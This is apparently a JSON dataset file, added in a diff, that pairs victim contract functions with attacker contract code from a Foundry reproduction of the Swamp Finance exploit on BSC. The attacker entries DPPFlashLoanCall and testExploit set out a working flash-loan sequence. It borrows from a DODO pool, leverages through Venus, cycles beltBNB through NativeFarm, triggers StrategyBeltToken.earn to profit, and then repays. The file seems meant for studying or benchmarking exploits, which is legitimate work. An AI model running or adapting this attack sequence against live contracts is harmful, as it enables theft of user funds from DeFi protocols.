@@ -1,0 +1,142 @@
+[
+  {
+    "contract/interface": "IbeltBNB",
+    "source_type": "victim_contract",
+    "function_name": "approve",
+    "original_code": "    function approve(address spender, uint256 amount) external returns (bool) {\n        address src = msg.sender;\n        transferAllowances[src][spender] = amount;\n        emit Approval(src, spender, amount);\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IbeltBNB",
+    "source_type": "victim_contract",
+    "function_name": "balanceOf",
+    "original_code": "    function balanceOf(address owner) external view returns (uint256) {\n        return accountTokens[owner];\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IbeltBNB",
+    "source_type": "victim_contract",
+    "function_name": "deposit",
+    "original_code": "    function deposit(address _userAddress, uint256 _wantAmt)\n        external\n        returns (uint256);\n\n    // Transfer want tokens strategy -> autoFarm\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IbeltBNB",
+    "source_type": "victim_contract",
+    "function_name": "transferFrom",
+    "original_code": "    function transferFrom(address src, address dst, uint256 amount) external nonReentrant returns (bool) {\n        return transferTokens(msg.sender, src, dst, amount) == uint(Error.NO_ERROR);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IbeltBNB",
+    "source_type": "victim_contract",
+    "function_name": "withdraw",
+    "original_code": "    function withdraw(address _userAddress, uint256 _wantAmt)\n        external\n        returns (uint256);\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SwampFinanceExploit",
+    "source_type": "attacker_contract",
+    "function_name": "DPPFlashLoanCall",
+    "original_code": "    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        approveAll();\n        address[] memory vTokens = new address[](2);\n        vTokens[0] = address(vUSDT);\n        vTokens[1] = address(vBNB);\n        VenusDistribution.enterMarkets(vTokens);\n\n        uint256 cachedBUSDTbalance = BUSDT.balanceOf(address(this));\n        vUSDT.mint(cachedBUSDTbalance);\n        vBNB.borrow(500 ether);\n        WBNB.deposit{value: address(this).balance}();\n        beltBNB.deposit(WBNB.balanceOf(address(this)), 1);\n        NativeFarm.deposit(135, beltBNB.balanceOf(address(this)));\n        StrategyBeltToken.earn();\n        NativeFarm.withdraw(135, type(uint256).max);\n        beltBNB.withdraw(beltBNB.balanceOf(address(this)), 1);\n        WBNB.withdraw(500 ether);\n        vBNB.repayBorrow{value: 500 ether}();\n        vUSDT.redeemUnderlying(cachedBUSDTbalance);\n\n        WBNB.transfer(address(DPPOracle), baseAmount);\n        BUSDT.transfer(address(DPPOracle), quoteAmount);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SwampFinanceExploit",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "SwampFinanceExploit",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SwampFinanceExploit",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SwampFinanceExploit",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SwampFinanceExploit",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SwampFinanceExploit",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", blocknumToForkFrom);\n        vm.label(address(WBNB), \"WBNB\");\n        vm.label(address(BUSDT), \"BUSDT\");\n        vm.label(address(beltBNB), \"beltBNB\");\n        vm.label(address(DPPOracle), \"DPPOracle\");\n        vm.label(address(VenusDistribution), \"VenusDistribution\");\n        vm.label(address(vUSDT), \"vUSDT\");\n        vm.label(address(vBNB), \"vBNB\");\n        vm.label(address(NativeFarm), \"NativeFarm\");\n        vm.label(address(StrategyBeltToken), \"StrategyBeltToken\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SwampFinanceExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SwampFinanceExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SwampFinanceExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SwampFinanceExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SwampFinanceExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SwampFinanceExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SwampFinanceExploit",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        deal(address(this), 0);\n        // In the begining transfer tokens from exploiter to attack contract\n        deal(address(WBNB), address(this), 1e15);\n        deal(address(BUSDT), address(this), 155_049_710_721_328_089);\n        deal(address(beltBNB), address(this), 1_272_113_372_028_660);\n\n        emit log_named_decimal_uint(\n            \"Exploiter WBNB balance before attack\", WBNB.balanceOf(address(this)), WBNB.decimals()\n        );\n\n        DPPOracle.flashLoan(3100e18, 150_000e18, address(this), bytes(\"_\"));\n\n        emit log_named_decimal_uint(\n            \"Exploiter WBNB balance after attack\", WBNB.balanceOf(address(this)), WBNB.decimals()\n        );\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IStrategyBeltToken",
+    "source_type": "victim_contract",
+    "function_name": "earn",
+    "original_code": "",
+    "description": ""
+  }
+]
